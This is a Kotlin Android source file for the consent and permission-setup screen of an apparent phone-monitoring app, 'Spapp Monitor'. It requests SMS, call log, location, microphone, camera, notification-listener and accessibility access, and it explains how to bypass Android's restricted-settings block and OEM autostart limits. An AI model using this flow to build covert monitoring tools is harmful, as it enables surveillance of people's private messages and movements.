package com.spapp.monitoring.ui

import android.Manifest
import android.app.AlertDialog
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.os.Process
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.spapp.monitoring.R
import com.spapp.monitoring.blocking.AccessibilityStatus
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.databinding.ActivityConsentBinding

/**
 * Mandatory first-launch screen. The user must explicitly tap "Allow" before
 * any permission is requested or any data collection begins.
 *
 * Tapping "ALLOW ALL PERMISSIONS" initiates a sequential setup flow:
 * 1. Runtime Permissions batch (Location, Calls, Contacts, SMS, Mic, Camera, Media, Notifications)
 * 2. Unrestricted Battery Optimization exemption
 * 3. All Files Storage access (Android 11+)
 * 4. Notification Listener access (WhatsApp & Instagram messages)
 * 5. Accessibility Service (Screen capture & live chat tracking)
 * 6. App Usage Stats (Screen time)
 * 7. Autostart (Xiaomi / Oppo / Vivo OEM ROMs)
 */
class ConsentActivity : AppCompatActivity() {

    private lateinit var binding: ActivityConsentBinding
    private var autostartPrompted = false

    private val corePermissions = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.CAMERA)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    // 1. Core Runtime Permissions Launcher
    private val runtimePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        checkAndPromptNextSystemPermission()
    }

    // 2. Battery Exemption Launcher
    private val batteryLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkAndPromptNextSystemPermission()
    }

    // 3. All Files Access Launcher
    private val allFilesLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkAndPromptNextSystemPermission()
    }

    // 4. Notification Listener Launcher
    private val notificationListenerLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkAndPromptNextSystemPermission()
    }

    // 5. Accessibility Launcher
    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkAndPromptNextSystemPermission()
    }

    // 6. Usage Stats Launcher
    private val usageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkAndPromptNextSystemPermission()
    }

    // 7. Autostart Launcher
    private val autostartLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        checkAndPromptNextSystemPermission()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityConsentBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.btnAllow.setOnClickListener {
            DeviceState(this).consentGiven = true
            runtimePermissionLauncher.launch(corePermissions)
        }

        binding.btnDecline.setOnClickListener {
            Toast.makeText(this, getString(R.string.consent_decline_message), Toast.LENGTH_LONG).show()
            finishAffinity()
        }
    }

    private fun checkAndPromptNextSystemPermission() {
        // Step 1: Battery Optimization Exemption
        if (!isBatteryExempted()) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                batteryLauncher.launch(intent)
                return
            } catch (e: Exception) {
                Log.w(TAG, "Battery ignore optimizations intent failed", e)
            }
        }

        // Step 2: All Files Access (Android 11+)
        if (!isFileAccessGranted()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    Toast.makeText(this, "Enable 'Allow access to manage all files', then tap Back", Toast.LENGTH_LONG).show()
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    allFilesLauncher.launch(intent)
                    return
                } catch (e: Exception) {
                    Log.w(TAG, "All files intent failed", e)
                }
            }
        }

        // Step 3: Notification Listener (WhatsApp & Instagram messages)
        if (!isNotificationAccessGranted()) {
            try {
                Toast.makeText(this, "Toggle ON Spapp Monitor in Notification Access, then tap Back", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                notificationListenerLauncher.launch(intent)
                return
            } catch (e: Exception) {
                Log.w(TAG, "Notification listener intent failed", e)
            }
        }

        // Step 4: Accessibility Service (Screen & Chats)
        if (!isAccessibilityEnabled()) {
            showAccessibilityDialog()
            return
        }

        // Step 5: App Usage Stats
        if (!isUsageAccessGranted()) {
            try {
                Toast.makeText(this, "Enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
                usageLauncher.launch(intent)
                return
            } catch (e: Exception) {
                Log.w(TAG, "Usage access intent failed", e)
            }
        }

        // Step 6: Autostart (Xiaomi / Vivo / Oppo / Huawei)
        if (isOemRom() && !autostartPrompted) {
            autostartPrompted = true
            val autostartIntent = getAutostartIntent()
            if (autostartIntent != null) {
                try {
                    Toast.makeText(this, "Enable Autostart for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
                    autostartLauncher.launch(autostartIntent)
                    return
                } catch (e: Exception) {
                    Log.w(TAG, "Autostart intent failed", e)
                }
            }
        }

        // All checks completed -> proceed to activation
        proceedToActivation()
    }

    private fun showAccessibilityDialog() {
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Chat Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return."
        } else {
            "To enable Live Screen & Chat Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    accessibilityLauncher.launch(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                    checkAndPromptNextSystemPermission()
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                openAppInfoSettings()
            }
            .setNegativeButton("Skip") { _, _ ->
                checkAndPromptNextSystemPermission()
            }
            .setCancelable(false)
            .show()
    }

    private fun isBatteryExempted(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        return powerManager.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isFileAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else {
            true
        }
    }

    private fun isNotificationAccessGranted(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: ""
        return flat.contains(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        return AccessibilityStatus.isEnabled(this)
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, Process.myUid(), packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun isOemRom(): Boolean {
        val manufacturer = Build.MANUFACTURER.lowercase()
        return manufacturer.contains("xiaomi") ||
                manufacturer.contains("redmi") ||
                manufacturer.contains("oppo") ||
                manufacturer.contains("vivo") ||
                manufacturer.contains("huawei") ||
                manufacturer.contains("honor")
    }

    private fun getAutostartIntent(): Intent? {
        val candidates = listOf(
            Intent().setComponent(
                ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")
            ),
            Intent().setComponent(
                ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity")
            ),
            Intent().setComponent(
                ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity")
            ),
            Intent().setComponent(
                ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")
            ),
            Intent().setComponent(
                ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")
            )
        )
        for (intent in candidates) {
            if (packageManager.resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY) != null) {
                return intent
            }
        }
        return null
    }

    private fun openAppInfoSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "No app-info settings screen available", e)
        }
    }

    private fun proceedToActivation() {
        startActivity(Intent(this, ActivationActivity::class.java))
        finish()
    }

    companion object {
        private const val TAG = "ConsentActivity"
    }
}
